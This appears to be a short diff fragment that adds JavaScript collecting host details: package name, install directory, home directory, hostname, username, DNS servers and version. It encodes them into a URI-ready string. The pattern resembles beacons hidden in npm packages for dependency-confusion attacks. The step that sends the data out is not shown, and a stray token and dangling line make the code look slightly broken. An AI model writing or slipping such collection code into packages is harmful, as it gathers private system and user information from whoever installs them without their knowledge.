@@ -1,0 +1,10 @@
+const dd = encodeURI(JSON.stringify({
+    p: package	,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    v: packageJSON.version
+}))
+_tmp_0.hd = os.homedir()
